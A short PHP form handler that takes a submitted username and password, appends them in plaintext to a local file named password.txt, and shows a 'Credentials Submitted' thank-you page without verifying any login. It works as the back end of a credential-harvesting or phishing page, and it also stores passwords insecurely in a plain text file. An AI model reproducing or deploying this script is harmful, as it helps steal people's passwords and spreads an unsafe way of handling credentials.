<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $username = htmlspecialchars($_POST['username']);
    $password = htmlspecialchars($_POST['password']);
    
    // Log the username and password to a file
    $data = "Username: $username, Password: $password" . PHP_EOL;
    file_put_contents('password.txt', $data, FILE_APPEND);

    // Respond to the user
    echo "<div class='response-container'>";
    echo "<h2>Credentials Submitted</h2>";
    echo "<p>Thank you, $username!</p>";
    echo "<a href='/'>Go back</a>";
    echo "</div>";
} else {
    echo "No data received.";
}
?>
